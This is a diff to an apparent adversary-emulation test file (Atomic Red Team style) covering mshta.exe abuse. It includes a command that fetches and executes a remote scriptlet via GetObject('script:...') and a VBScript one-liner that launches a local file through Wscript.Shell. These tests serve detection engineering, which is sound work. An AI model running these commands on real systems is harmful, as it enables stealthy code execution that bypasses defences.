@@ -17,9 +17,26 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();      
 
-- name: Mshta executes VBScript to execute malicious code
+- name: Mshta calls a local VBScript file to launch notepad.exe
+  description: Tests execution of a local program by a VBScript file called by Mshta
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    local_file: 
+      description: Create a local VBScript file
+      type: path
+      default: C:\Temp\mshta_notepad.vbs
+
+  executor:
+    name: command_prompt
+    command: |
+      mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
+
+- name: Mshta executes VBScript to execute malicious command
   description: |
     Run a local VB script to run local user enumeration powershell command
 
